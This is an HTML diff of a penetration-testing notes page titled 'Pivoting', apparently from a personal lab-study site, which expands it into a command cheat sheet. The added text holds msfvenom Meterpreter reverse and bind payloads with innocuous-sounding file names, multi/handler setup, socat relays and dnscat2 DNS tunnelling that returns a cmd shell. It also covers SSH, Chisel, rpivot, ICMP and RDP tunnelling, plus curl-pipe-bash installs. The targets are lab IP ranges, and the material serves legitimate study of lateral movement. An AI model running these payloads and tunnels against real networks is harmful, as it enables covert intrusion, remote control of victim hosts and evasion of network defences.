@@ -9,7 +9,7 @@
       
       
       
-        <link rel="prev" href="../metasploit/metasploit/">
+        <link rel="prev" href="../passwords/passwords/">
       
       
         <link rel="next" href="../bash/bash_scripts/">
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#chisel" class="md-skip">
+        <a href="#dynamic-port-forwarding-with-ssh-and-socks-tunneling" class="md-skip">
           Skip to content
         </a>
       
@@ -1117,6 +1117,26 @@
       
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../passwords/passwords/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwords Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
     
   
   
@@ -1162,9 +1182,162 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#chisel" class="md-nav__link">
+  <a href="#dynamic-port-forwarding-with-ssh-and-socks-tunneling" class="md-nav__link">
     <span class="md-ellipsis">
-      CHISEL
+      Dynamic Port Forwarding with SSH and SOCKS Tunneling
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Dynamic Port Forwarding with SSH and SOCKS Tunneling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-to-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up to Pivot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remotereverse-port-forwarding-with-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote/Reverse Port Forwarding with SSH
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#meterpreter-tunneling-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Meterpreter Tunneling &amp; Port Forwarding
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Meterpreter Tunneling & Port Forwarding">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socat-redirection-with-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat Redirection with a Reverse Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socat-redirection-with-a-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat Redirection with a Bind Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-for-windows-plinkexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH for Windows: plink.exe
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-pivoting-with-sshuttle" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH Pivoting with Sshuttle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-server-pivoting-with-rpivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Server Pivoting with Rpivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-forwarding-with-windows-netsh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Forwarding with Windows Netsh
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling-with-dnscat2" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling with Dnscat2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socks5-tunneling-with-chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS5 Tunneling with Chisel
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SOCKS5 Tunneling with Chisel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#chisel-reverse-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Chisel Reverse Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#icmp-tunneling-with-socks" class="md-nav__link">
+    <span class="md-ellipsis">
+      ICMP Tunneling with SOCKS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-and-socks-tunneling-with-socksoverrdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP and SOCKS Tunneling with SocksOverRDP
     </span>
   </a>
   
@@ -1210,10 +1383,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
         
           
-          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1224,8 +1397,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_10">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
             <span class="md-nav__icon md-icon"></span>
             Walkthrough
           </label>
@@ -1314,10 +1487,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
         
           
-          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1328,8 +1501,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_12">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
             <span class="md-nav__icon md-icon"></span>
             Blue
           </label>
@@ -1388,9 +1561,162 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#chisel" class="md-nav__link">
+  <a href="#dynamic-port-forwarding-with-ssh-and-socks-tunneling" class="md-nav__link">
     <span class="md-ellipsis">
-      CHISEL
+      Dynamic Port Forwarding with SSH and SOCKS Tunneling
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Dynamic Port Forwarding with SSH and SOCKS Tunneling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-to-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up to Pivot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remotereverse-port-forwarding-with-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote/Reverse Port Forwarding with SSH
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#meterpreter-tunneling-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Meterpreter Tunneling &amp; Port Forwarding
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Meterpreter Tunneling & Port Forwarding">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socat-redirection-with-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat Redirection with a Reverse Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socat-redirection-with-a-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat Redirection with a Bind Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-for-windows-plinkexe" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH for Windows: plink.exe
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-pivoting-with-sshuttle" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH Pivoting with Sshuttle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-server-pivoting-with-rpivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Server Pivoting with Rpivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-forwarding-with-windows-netsh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Forwarding with Windows Netsh
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling-with-dnscat2" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling with Dnscat2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socks5-tunneling-with-chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS5 Tunneling with Chisel
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SOCKS5 Tunneling with Chisel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#chisel-reverse-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Chisel Reverse Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#icmp-tunneling-with-socks" class="md-nav__link">
+    <span class="md-ellipsis">
+      ICMP Tunneling with SOCKS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-and-socks-tunneling-with-socksoverrdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP and SOCKS Tunneling with SocksOverRDP
     </span>
   </a>
   
@@ -1431,18 +1757,225 @@
 
   <h1>Pivoting</h1>
 
-<h2 id="chisel">CHISEL</h2>
+<h2 id="dynamic-port-forwarding-with-ssh-and-socks-tunneling"><strong>Dynamic Port Forwarding with SSH and SOCKS Tunneling</strong></h2>
 <ol>
-<li>Install on attack box: <code>curl https://i.jpillora.com/chisel! | bash</code></li>
+<li>Scanning the Pivot Target: <code>nmap -sT -p22,3306 10.129.202.64</code></li>
+<li>Executing the Local Port Forward: <code>ssh -L 1234:localhost:3306 ubuntu@10.129.202.64</code></li>
+<li>Confirming Port Forward with Netstat: <code>netstat -antp | grep 1234</code></li>
+<li>Confirming Port Forward with Nmap: <code>nmap -v -sV -p1234 localhost</code></li>
+<li>Forwarding Multiple Ports: <code>ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64</code></li>
+</ol>
+<h3 id="setting-up-to-pivot"><strong>Setting up to Pivot</strong></h3>
+<ol>
+<li>Enabling Dynamic Port Forwarding with SSH: <code>ssh -D 9050 ubuntu@10.129.202.64</code></li>
+<li>Checking /etc/proxychains.conf: <code>tail -4 /etc/proxychains.conf</code></li>
+<li>Using Nmap with Proxychains: <code>proxychains nmap -v -sn 172.16.5.1-200</code></li>
+<li>Enumerating the Windows Target through Proxychains: <code>proxychains nmap -v -Pn -sT 172.16.5.19</code></li>
+<li>Using Metasploit with Proxychains: <ol>
+<li><code>proxychains msfconsole</code></li>
+<li><code>search rdp_scanner</code></li>
+<li><code>set rhosts</code></li>
+</ol>
+</li>
+<li>Using xfreerdp with Proxychains: <code>proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></li>
+</ol>
+<h2 id="remotereverse-port-forwarding-with-ssh"><strong>Remote/Reverse Port Forwarding with SSH</strong></h2>
+<ol>
+<li>Creating a Windows Payload with msfvenom: <code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></li>
+<li>Configuring &amp; Starting the multi/handler: <ol>
+<li><code>use exploit/multi/handler</code></li>
+<li><code>set payload windows/x64/meterpreter/reverse_https</code></li>
+<li><code>set lhost 0.0.0.0</code></li>
+<li><code>set lport 8000</code></li>
+</ol>
+</li>
+<li>Transferring Payload to Pivot Host: <code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></li>
+<li>Starting Python3 Webserver on Pivot Host: <code>python3 -m http.server 8123</code></li>
+<li>Downloading Payload on the Windows Target: <code>Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"</code></li>
+<li>Using SSH -R: <code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></li>
+<li>Meterpreter Session Established: <code>shell</code></li>
+</ol>
+<h2 id="meterpreter-tunneling-port-forwarding"><strong>Meterpreter Tunneling &amp; Port Forwarding</strong></h2>
+<ol>
+<li>Creating Payload for Ubuntu Pivot Host: <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></li>
+<li>Configuring &amp; Starting the multi/handler:<ol>
+<li><code>use exploit/multi/handler</code></li>
+<li><code>set payload linux/x64/meterpreter/reverse_tcp</code></li>
+<li><code>set lhost 0.0.0.0</code></li>
+<li><code>set lport 8000</code></li>
+</ol>
+</li>
+<li>Executing the Payload on the Pivot Host:<ol>
+<li><code>chmod +x backupjob</code></li>
+<li><code>./backupjob</code></li>
+</ol>
+</li>
+<li>Meterpreter Session Establishment</li>
+<li>Ping Sweep: <code>run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></li>
+<li>Ping Sweep For Loop on Linux Pivot Hosts: <code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &amp;) ;done</code></li>
+<li>Ping Sweep For Loop Using CMD: <code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"</code></li>
+<li>Ping Sweep Using PowerShell: <code>1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}</code></li>
+<li>Configuring MSF's SOCKS Proxy: <ol>
+<li><code>use auxiliary/server/socks_proxy</code></li>
+<li><code>set SRVPORT 9050</code></li>
+<li><code>set SRVHOST 0.0.0.0</code></li>
+<li><code>set version 4a</code></li>
+<li>Confirming Proxy Server is Running: <code>job</code></li>
+</ol>
+</li>
+<li>Adding a Line to proxychains.conf if Needed: <code>socks4    127.0.0.1 9050</code></li>
+<li>Creating Routes with AutoRoute:<ol>
+<li><code>use post/multi/manage/autoroute</code></li>
+<li><code>set SESSION 1</code></li>
+<li><code>set SUBNET 172.16.5.0</code></li>
+<li>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session: <code>run autoroute -s 172.16.5.0/23</code></li>
+<li>Listing Active Routes with AutoRoute: <code>run autoroute -p</code></li>
+</ol>
+</li>
+<li>Testing Proxy &amp; Routing Functionality: <code>proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></li>
+</ol>
+<h3 id="port-forwarding"><strong>Port Forwarding</strong></h3>
+<ol>
+<li>Creating Local TCP Relay: <code>portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></li>
+<li>Connecting to Windows Target through localhost: `</li>
+<li>Netstat Output: <code>netstat -antp</code></li>
+<li>Reverse Port Forwarding Rules: <code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18</code></li>
+<li>Configuring &amp; Starting multi/handler:<ol>
+<li><code>bg</code></li>
+<li><code>set payload windows/x64/meterpreter/reverse_tcp</code></li>
+<li><code>set LPORT 8081</code></li>
+<li><code>set LHOST 0.0.0.0</code></li>
+</ol>
+</li>
+<li>Generating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234</code></li>
+<li>Execute paylload on Windows host and get a shell with <code>shell</code> command.</li>
+</ol>
+<h2 id="socat-redirection-with-a-reverse-shell"><strong>Socat Redirection with a Reverse Shell</strong></h2>
+<ol>
+<li>Starting Socat Listener: <code>socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></li>
+<li>Creating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></li>
+<li>Configuring &amp; Starting the multi/handler: <ol>
+<li><code>use exploit/multi/handler</code></li>
+<li><code>set payload windows/x64/meterpreter/reverse_https</code></li>
+<li><code>set lhost 0.0.0.0</code></li>
+<li><code>set lport 80</code></li>
+</ol>
+</li>
+<li>Test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.</li>
+</ol>
+<h2 id="socat-redirection-with-a-bind-shell"><strong>Socat Redirection with a Bind Shell</strong></h2>
+<ol>
+<li>Creating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443</code></li>
+<li>Starting Socat Bind Shell Listener: <code>socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></li>
+<li>Configuring &amp; Starting the Bind multi/handler:<ol>
+<li><code>use exploit/multi/handler</code></li>
+<li><code>set payload windows/x64/meterpreter/bind_tcp</code></li>
+<li><code>set RHOST 10.129.202.64</code></li>
+<li><code>set LPORT 8080</code></li>
+</ol>
+</li>
+<li>We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.</li>
+</ol>
+<h2 id="ssh-for-windows-plinkexe"><strong>SSH for Windows: plink.exe</strong></h2>
+<ol>
+<li>Using Plink.exe: <code>plink -ssh -D 9050 ubuntu@10.129.15.50</code></li>
+<li>Proxifier can be used to start a SOCKS tunnel via the SSH. After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.</li>
+</ol>
+<h2 id="ssh-pivoting-with-sshuttle"><strong>SSH Pivoting with Sshuttle</strong></h2>
+<ol>
+<li>Running sshuttle: <code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v</code></li>
+<li>With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.</li>
+</ol>
+<h2 id="web-server-pivoting-with-rpivot"><strong>Web Server Pivoting with Rpivot</strong></h2>
+<ol>
+<li>Cloning rpivot: <code>git clone https://github.com/klsecservices/rpivot.git</code></li>
+<li>Installing Python2.7: <code>sudo apt-get install python2.7</code></li>
+<li>Alternative Installation of Python2.7:</li>
+</ol>
+<pre><code class="language-bash">curl https://pyenv.run | bash
+echo 'export PYENV_ROOT=&quot;$HOME/.pyenv&quot;' &gt;&gt; ~/.bashrc
+echo 'command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;' &gt;&gt; ~/.bashrc
+echo 'eval &quot;$(pyenv init -)&quot;' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+</code></pre>
+<ol>
+<li>Running server.py from the Attack Host: <code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></li>
+<li>Transfering rpivot to the Target: <code>scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></li>
+<li>Running client.py from Pivot Target: <code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></li>
+<li>We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.</li>
+<li>Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox: <code>proxychains firefox-esr 172.16.5.135:80</code></li>
+<li>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth: <code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></li>
+</ol>
+<h2 id="port-forwarding-with-windows-netsh"><strong>Port Forwarding with Windows Netsh</strong></h2>
+<ol>
+<li>Using Netsh.exe to Port Forward: <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</code></li>
+<li>Verifying Port Forward: <code>netsh.exe interface portproxy show v4tov4</code></li>
+</ol>
+<h2 id="dns-tunneling-with-dnscat2"><strong>DNS Tunneling with Dnscat2</strong></h2>
+<ol>
+<li>Cloning dnscat2 and Setting Up the Server: <code>git clone https://github.com/iagox86/dnscat2.git</code></li>
+<li>Starting the dnscat2 server: <code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></li>
+<li>Cloning dnscat2-powershell to the Attack Host: <code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></li>
+<li>Importing dnscat2.ps1: <code>Import-Module .\dnscat2.ps1</code></li>
+<li>After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server: <code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></li>
+<li>Listing dnscat2 Options: <code>?</code></li>
+<li>Interacting with the Established Session: <ol>
+<li><code>window -i 1</code></li>
+</ol>
+</li>
+</ol>
+<h2 id="socks5-tunneling-with-chisel"><strong>SOCKS5 Tunneling with Chisel</strong></h2>
+<ol>
+<li>Clone repo: <code>git clone https://github.com/jpillora/chisel.git</code></li>
+<li><code>cd chisel</code></li>
+<li><code>go build</code></li>
+<li>Transferring Chisel Binary to Pivot Host: <code>scp chisel ubuntu@10.129.202.64:~/</code></li>
+<li>Running the Chisel Server on the Pivot Host: <code>./chisel server -v -p 1234 --socks5</code></li>
+<li>Connecting to the Chisel Server: <code>./chisel client -v 10.129.202.64:1234 socks</code></li>
+<li>Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.</li>
+<li>Editing &amp; Confirming proxychains.conf: <code>socks5 127.0.0.1 1080</code></li>
+</ol>
+<h3 id="chisel-reverse-pivot"><strong>Chisel Reverse Pivot</strong></h3>
+<ol>
+<li>Install on attack box: <code>curl https://i.jpillora.com/chisel! | bash</code> or clone repo: <code>git clone https://github.com/jpillora/chisel.git</code></li>
 <li>Edit /etc/proxychains.conf &gt; socks5 127.0.0.1 1080</li>
-<li>Run server: <code>chisel server -p 8001 —reverse</code></li>
-<li>Run client:  <code>.\chisel.exe client 10.10.14.179:8001 R:1080:socks</code></li>
+<li>Starting the Chisel Server on our Attack Host: <code>sudo ./chisel server --reverse -v -p 1234 --socks5</code></li>
+<li>Connecting the Chisel Client to our Attack Host:  <code>../chisel client -v 10.10.14.17:1234 R:socks</code></li>
 <li>Run command: <code>proxychains4 -q nmap ip-address</code></li>
 <li>Links:<ol>
 <li><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li>
 <li><a href="https://ap3x.github.io/posts/pivoting-with-chisel/">https://ap3x.github.io/posts/pivoting-with-chisel/</a></li>
 </ol>
 </li>
+</ol>
+<h3 id="icmp-tunneling-with-socks"><strong>ICMP Tunneling with SOCKS</strong></h3>
+<ol>
+<li>Cloning Ptunnel-ng: <code>git clone https://github.com/utoni/ptunnel-ng.git</code></li>
+<li>Building Ptunnel-ng with Autogen.sh: <code>sudo ./autogen.sh</code></li>
+<li>Alternative approach of building a static binary:</li>
+</ol>
+<pre><code class="language-bash">sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static &quot;${NEW_WD}\/configure&quot; --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+</code></pre>
+<ol>
+<li>Transferring Ptunnel-ng to the Pivot Host: <code>scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></li>
+<li>Starting the ptunnel-ng Server on the Target Host: <code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></li>
+<li>Connecting to ptunnel-ng Server from Attack Host: <code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></li>
+<li>Tunneling an SSH connection through an ICMP Tunnel: <code>ssh -p2222 -lubuntu 127.0.0.1</code></li>
+<li>Enabling Dynamic Port Forwarding over SSH: <code>ssh -D 9050 -p2222 -lubuntu 127.0.0.1</code></li>
+<li>Proxychaining through the ICMP Tunnel: <code>proxychains nmap -sV -sT 172.16.5.19 -p3389</code></li>
+</ol>
+<h2 id="rdp-and-socks-tunneling-with-socksoverrdp"><strong>RDP and SOCKS Tunneling with SocksOverRDP</strong></h2>
+<ol>
+<li>Loading SocksOverRDP.dll using regsvr32.exe: <code>regsvr32.exe SocksOverRDP-Plugin.dll</code></li>
+<li>Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080</li>
+<li>We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.</li>
+<li>When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080</li>
+<li>Confirming the SOCKS Listener is Started: <code>netstat -antb | findstr 1080</code></li>
 </ol>
 <h2 id="netcat">NETCAT</h2>
 <ol>
